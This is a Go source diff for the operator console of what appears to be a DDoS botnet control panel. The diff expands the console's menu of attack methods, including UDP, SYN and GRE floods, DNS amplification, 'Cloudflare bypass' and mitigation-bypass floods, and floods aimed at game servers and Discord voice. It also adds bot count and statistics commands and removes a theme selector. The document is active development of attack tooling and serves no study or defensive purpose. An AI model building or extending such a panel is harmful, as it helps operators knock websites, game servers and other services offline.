@@ -116,15 +116,40 @@ func (a *Admin) Commands() {
 			pColor := HexToAnsi(a.PrimaryColor)
 			sColor := HexToAnsi(a.SecondaryColor)
 			white := "\x1b[97m"
+			gray := "\x1b[90m"
 			reset := "\x1b[0m"
 
-			a.Println(pColor + "Attack vectors:" + reset + " " + white + "udp <target> <port> <duration> <len> [...options]" + reset)
-			a.Println("  " + "-" + reset + " " + pColor + "udpplain" + reset + "   " + white + "UDP plain flood" + reset)
-			a.Println("  " + "-" + reset + " " + pColor + "udp" + reset + "        " + white + "UDP flood for high GBPS" + reset)
-			a.Println("  " + "-" + reset + " " + pColor + "ack" + reset + "        " + white + "TCP ACK flood" + reset)
-			a.Println("  " + "-" + reset + " " + pColor + "syn" + reset + "        " + white + "TCP SYN flood" + reset)
-			a.Println("  " + "-" + reset + " " + pColor + "greip" + reset + "      " + white + "L3 GRE IP flood" + reset)
-			a.Println(pColor + "Commands:" + reset + " " + reset)
+			a.Println(pColor + "Layer 4:" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "udp" + reset + "        " + gray + "UDP flood - high bandwidth" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "udpplain" + reset + "   " + gray + "UDP socket flood (no raw socket)" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "udphex" + reset + "     " + gray + "UDP flood with hex payload" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "syn" + reset + "        " + gray + "TCP SYN flood" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "ack" + reset + "        " + gray + "TCP ACK flood" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "stomp" + reset + "      " + gray + "TCP handshake + ACK/PSH flood" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "tcpbypass" + reset + "  " + gray + "TCP flood to bypass mitigation" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "socket" + reset + "     " + gray + "Standard TCP socket flood" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "greip" + reset + "      " + gray + "GRE IP encapsulation flood" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "greeth" + reset + "     " + gray + "GRE Ethernet encapsulation flood" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "pps" + reset + "        " + gray + "PPS (packets per second) raw flood" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "dns" + reset + "        " + gray + "DNS amplification attack" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "esp" + reset + "        " + gray + "ESP/IPSec flood" + reset)
+			a.Println(pColor + "Layer 7:" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "http" + reset + "       " + gray + "HTTP/1.1 GET flood" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "tls" + reset + "        " + gray + "TLS/SSL handshake flood" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "tlsplus" + reset + "    " + gray + "TLS+ bypass flood" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "cloudflare" + reset + " " + gray + "Cloudflare bypass flood" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "nerv_l7" + reset + "    " + gray + "NERV L7 special bypass flood" + reset)
+			a.Println(pColor + "Games:" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "vse" + reset + "        " + gray + "Valve Source Engine query flood" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "raknet" + reset + "     " + gray + "RakNet game server flood" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "fivem" + reset + "      " + gray + "FiveM game server connect flood" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "discord" + reset + "    " + gray + "Discord voice gateway flood" + reset)
+			a.Println(pColor + "Usage:" + reset + " " + white + "<method> <target> <port> <duration> [options]" + reset)
+			a.Println(pColor + "Commands:" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "help" + reset + "      " + white + "Show detailed help" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "clear" + reset + "     " + white + "Clear screen" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "count" + reset + "     " + white + "Show total bot count" + reset)
+			a.Println("  " + sColor + "-" + reset + " " + pColor + "stats" + reset + "     " + white + "Show bot statistics" + reset)
 			a.Println("  " + sColor + "-" + reset + " " + pColor + "passwd" + reset + "    " + white + "Change your account password" + reset)
 			continue
 		}
@@ -140,58 +165,7 @@ func (a *Admin) Commands() {
 			continue
 		}
 
-		if strings.HasPrefix(cmd, "themes") {
-			args := strings.Fields(cmd)
-			if len(args) < 2 {
-				a.Println("Usage: themes <list|set>")
-				continue
-			}
-
-			subCmd := args[1]
-
-			if subCmd == "list" {
-				entries, err := os.ReadDir("assets/branding")
-				if err != nil {
-					a.Println("Error reading themes directory: ", err)
-					continue
-				}
-
-				table := simpletable.New()
-				table.Header = &simpletable.Header{
-					Cells: []*simpletable.Cell{
-						{Align: simpletable.AlignCenter, Text: "Theme Name"},
-					},
-				}
-
-				for _, entry := range entries {
-					if entry.IsDir() {
-						table.Body.Cells = append(table.Body.Cells, []*simpletable.Cell{
-							{Text: entry.Name()},
-						})
-					}
-				}
-				table.SetStyle(simpletable.StyleCompactLite)
-				a.Println(strings.ReplaceAll(table.String(), "\n", "\r\n"))
-				continue
-			}
-
-			if subCmd == "set" {
-				if len(args) < 3 {
-					a.Println("themes set <theme_name>")
-					continue
-				}
-				themeName := args[2]
-				_, err := os.Stat("assets/branding/" + themeName)
-				if os.IsNotExist(err) {
-					a.Println("Theme does not exist")
-					continue
-				}
-				a.Theme = themeName
-				a.PrimaryColor, a.SecondaryColor = LoadThemeConfig(themeName)
-				a.Println("Theme set to " + themeName)
-				continue
-			}
-		}
+		// Themes command removed - NERV theme is now the default and only theme
 
 		if cmd == "ongoing" || cmd == "bcstats" {
 			if !a.Session.Account.Admin {
